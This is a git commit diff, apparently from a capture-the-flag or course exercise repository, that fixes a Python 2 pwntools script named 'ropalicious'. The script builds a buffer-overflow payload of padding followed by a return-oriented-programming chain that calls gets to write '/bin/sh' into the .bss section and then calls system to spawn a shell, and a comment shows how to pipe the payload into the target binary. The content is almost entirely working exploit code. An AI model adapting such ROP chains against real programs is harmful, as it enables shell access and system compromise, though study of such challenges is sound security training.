298045ea18118ac7d0bc5d3638a4d8191c943865
Rot256 <Rot256@users.noreply.github.com>
2015-12-17 11:33:14 +0000

    Fixed ropalicious

--- diku/ropalicious/rop.py
+++ diku/ropalicious/rop.py
@@ -1,21 +1,31 @@
-#!/bin/python2
+#!/usr/bin/python2
 
 """
     ROPalicious payload generation
     2015-11-01
     ROT
+
+    strace -fi
+    bash -c "(cat shell; cat) | ./ropalicious"
 """
 
 import sys
-from pwn import p32
+from pwn import p32, flat
 
 system_addr = 0x8048330
-sh_addr = 0xf7f4e8f9
-# sh_addr = 0x0804854c
+bss = 0x080497b8
+pop_ret = 0x8048546
+gets_addr = 0x8048310
 
 sys.stdout.write('y')
 sys.stdout.write(75*'A')
-sys.stdout.write(p32(system_addr))
-sys.stdout.write('BBBB')
-sys.stdout.write(p32(sh_addr))
-sys.stdout.write('\n')
+sys.stdout.write(flat(
+    gets_addr,
+    pop_ret,
+    bss,
+    system_addr,
+    'AAAA',
+    bss,
+    '\n',
+    '/bin/sh\n',
+))
